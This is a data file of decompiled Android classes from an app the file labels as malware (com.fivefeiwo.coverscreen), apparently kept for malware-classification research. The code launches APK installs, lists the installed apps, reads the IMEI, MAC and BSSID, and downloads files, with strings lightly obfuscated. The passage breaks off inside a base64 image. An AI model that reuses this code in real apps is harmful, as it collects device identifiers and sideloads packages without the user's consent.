"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ag.code","public final class ag {   private static ag a=null;   private ag(){   }   public static ag a(){     if (a == null) {       a=new ag();     }     return a;   }   public static void a(  Context context,  String str){     if (aq.a(str)) {       return;     }     File file=new File(str);     Intent intent=new Intent();     intent.addFlags(272629760);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     context.startActivity(intent);   }   public static void b(  Context context,  String str){     if (aq.a(str)) {       return;     }     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent();     try {       intent=packageManager.getLaunchIntentForPackage(str);     }  catch (    ActivityNotFoundException e) {     }     context.startActivity(intent);   }   public static boolean c(  Context context,  String str){     if (aq.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    Exception e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ah.code","public final class ah {   private static ah a;   private ah(){     ""PackageInfoManager_feiwocp"".replace(""_feiwocp"","""");   }   public static ah a(){     if (a == null) {       a=new ah();     }     return a;   }   public static String a(  Context context,  boolean z){     int i=0;     StringBuffer stringBuffer=new StringBuffer();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 >= installedPackages.size()) {         return stringBuffer.toString().substring(1);       }       PackageInfo packageInfo=installedPackages.get(i2);       if ((packageInfo.applicationInfo.flags & 1) == 0) {         stringBuffer.append("","");         stringBuffer.append(packageInfo.packageName);       }       i=i2 + 1;     }   }   public static boolean a(  Context context,  String str){     if (aq.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ai.code","public final class ai { static {     ""SAVE_IMEI_feiwocp"".replace(""_feiwocp"","""");   }   public static String a(){     try {       return Build.MANUFACTURER;     }  catch (    Exception e) {       return """";     }   }   public static String a(  Context context){     String str;     try {       str=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     }  catch (    Exception e) {       str=null;     }     return aq.a(str) ? b(context) : str;   }   public static String b(){     try {       return Build.MODEL;     }  catch (    Exception e) {       return """";     }   }   public static String b(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_feiwocp"".replace(""_feiwocp"",""""))).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return null;     }   }   public static String c(){     try {       return Build.VERSION.SDK;     }  catch (    Exception e) {       return """";     }   }   public static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_feiwocp"".replace(""_feiwocp"",""""))).getConnectionInfo().getBSSID();     }  catch (    Exception e) {       return null;     }   }   public static ao d(  Context context){     ao aoVar=new ao();     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics);     aoVar.a=displayMetrics.widthPixels;     aoVar.b=displayMetrics.heightPixels;     return aoVar;   }   public static String d(){     try {       return Build.VERSION.RELEASE;     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\aj.code","public final class aj {   private static aj a=null;   private Handler b=new al(this);   private ConcurrentHashMap f115c=new ConcurrentHashMap();   private ExecutorService d=Executors.newSingleThreadExecutor();   private ConcurrentHashMap e=new ConcurrentHashMap();   public static Bitmap a(  Context context,  String str){     Bitmap bitmap;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i=options.outWidth;     int i2=options.outHeight;     ao d=ai.d(context);     int i3=1;     while (i / 2 > d.a && i2 / 2 > d.b) {       i/=2;       i2/=2;       i3<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i3;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public static aj a(){     if (a == null) {       a=new aj();     }     return a;   }   public static void a(  aj ajVar,  Context context,  String str){     HttpURLConnection httpURLConnection;     FileOutputStream fileOutputStream;     HttpURLConnection httpURLConnection2;     InputStream inputStream;     FileOutputStream fileOutputStream2;     FileOutputStream fileOutputStream3=null;     fileOutputStream3=null;     HttpURLConnection httpURLConnection3=null;     Y.a();     String a2=Y.a(context,S.d,str);     File file=new File(a2 + ""."" + System.currentTimeMillis()+ "".temp_feiwocp"".replace(""_feiwocp"",""""));     File file2=new File(a2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(5000);         httpURLConnection2.setReadTimeout(5000);         httpURLConnection2.setRequestMethod(""GET_feiwocp"".replace(""_feiwocp"",""""));         httpURLConnection2.connect();         inputStream=httpURLConnection2.getInputStream();         fileOutputStream2=new FileOutputStream(file);       }  catch (      Exception e) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      Throwable th) {         httpURLConnection=httpURLConnection2;         th=th;       }     }  catch (    Exception e2) {       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       httpURLConnection=null;     }     try {       byte[] bArr=new byte[1024];       while (true) {         int read=inputStream.read(bArr);         if (read == -1) {           break;         }  else {           fileOutputStream2.write(bArr,0,read);         }       }       fileOutputStream2.flush();       fileOutputStream2.close();       file.renameTo(file2);       try {         fileOutputStream2.close();         if (httpURLConnection2 != null) {           httpURLConnection2.disconnect();         }       }  catch (      IOException e3) {       }     }  catch (    Exception e4) {       httpURLConnection3=httpURLConnection2;       fileOutputStream=fileOutputStream2;       if (fileOutputStream != null) {         try {           fileOutputStream.close();         }  catch (        IOException e5) {           return;         }       }       if (httpURLConnection3 != null) {         httpURLConnection3.disconnect();       }     } catch (    Throwable th3) {       fileOutputStream3=fileOutputStream2;       httpURLConnection=httpURLConnection2;       th=th3;       if (fileOutputStream3 != null) {         try {           fileOutputStream3.close();         }  catch (        IOException e6) {           throw th;         }       }       if (httpURLConnection != null) {         httpURLConnection.disconnect();       }       throw th;     }   }   public final Drawable a(  Context context,  String str,  am amVar){     boolean z;     if (this.f115c.containsKey(str)) {       Queue queue=(Queue)this.f115c.get(str);       if (amVar != null) {         queue.add(amVar);       }       z=true;     }  else {       ConcurrentLinkedQueue concurrentLinkedQueue=new ConcurrentLinkedQueue();       this.f115c.put(str,concurrentLinkedQueue);       if (amVar != null) {         concurrentLinkedQueue.add(amVar);       }       z=false;     }     if (!z) {       this.d.submit(new ak(this,context,str));     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ak.code","public final class ak implements Runnable {   private Context a;   private String b;   private aj f116c;   public ak(  aj ajVar,  Context context,  String str){     this.f116c=ajVar;     this.a=context;     this.b=str;   }   @Override public final void run(){     ConcurrentHashMap concurrentHashMap;     Handler handler;     Handler handler2;     Y.a();     String a=Y.a(this.a,S.d,this.b);     concurrentHashMap=this.f116c.e;     WeakReference weakReference=(WeakReference)concurrentHashMap.get(this.b);     Bitmap bitmap=weakReference != null ? (Bitmap)weakReference.get() : null;     if (bitmap == null) {       try {         aj ajVar=this.f116c;         bitmap=aj.a(this.a,a);       }  catch (      Exception e) {       }     }     if (bitmap == null) {       try {         aj.a(this.f116c,this.a,this.b);       }  catch (      Exception e2) {       }     }     if (bitmap == null) {       try {         aj ajVar2=this.f116c;         bitmap=aj.a(this.a,a);       }  catch (      Exception e3) {       }     }     new StringBuilder().append(""loadDrawable complete, bitmap: "").append(bitmap).append("", url: "").append(this.b);     handler=this.f116c.b;     handler2=this.f116c.b;     handler.sendMessage(handler2.obtainMessage(0,new Object[]{this.b,bitmap}));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\al.code","public final class al extends Handler {   private aj a;   public al(  aj ajVar){     this.a=ajVar;   }   @Override public final void handleMessage(  Message message){     ConcurrentHashMap concurrentHashMap;     ConcurrentHashMap concurrentHashMap2;     if (message.obj == null) {       return;     }     Object[] objArr=(Object[])message.obj;     String str=(String)objArr[0];     Bitmap bitmap=(Bitmap)objArr[1];     BitmapDrawable bitmapDrawable=null;     if (bitmap != null) {       concurrentHashMap2=this.a.e;       concurrentHashMap2.put(str,new WeakReference(bitmap));       bitmapDrawable=new BitmapDrawable(bitmap);     }     concurrentHashMap=this.a.f115c;     Queue queue=(Queue)concurrentHashMap.remove(str);     if (queue != null) {       Iterator it=queue.iterator();       while (it.hasNext()) {         ((am)it.next()).a(bitmapDrawable);       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\am.code","public interface am {   void a(  Drawable drawable); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\an.code","public final class an {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Drawable a(  String str){     Drawable drawable=null;     try {       if (S.f.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream(""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"".getBytes(com.seleuco.common.util.e.f)),0),null);       }  else       if (S.g.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream("""".getBytes(com.seleuco.common.util.e.f)),0),null);       }  else       if (S.h.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream(""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